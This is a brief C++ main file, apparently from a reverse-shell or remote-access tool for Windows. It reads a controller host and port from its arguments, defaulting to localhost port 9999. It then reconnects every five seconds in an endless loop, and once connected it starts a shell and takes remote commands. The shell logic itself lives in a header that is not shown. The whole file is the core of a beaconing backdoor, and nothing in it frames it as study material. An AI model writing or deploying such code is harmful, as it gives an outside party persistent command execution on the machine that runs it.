#include <thread>
#include <chrono>
// this define stops windows.h including winsock.h
#define _WINSOCKAPI_
#include <Windows.h>
#include "client.hpp"

auto main(int argc, char* argv[]) -> int
{
	ShowWindow(GetConsoleWindow(), SW_SHOW);

	const char* chost;
	unsigned short int cport;
	if (argc == 3) {
		chost = argv[1];
		cport = atoi(argv[2]);
	}
	else {
		chost = "127.0.0.1";
		cport = 9999;
	}

	Client client(chost, cport);
	while (1) {
		std::this_thread::sleep_for(std::chrono::seconds(5));
		client.connect_socket();
		if (client.check_connection() == false) { continue; }
		else {
			client.start_shell();
			client.receive_commands();
			continue;
		}
	}
	return 0;
}
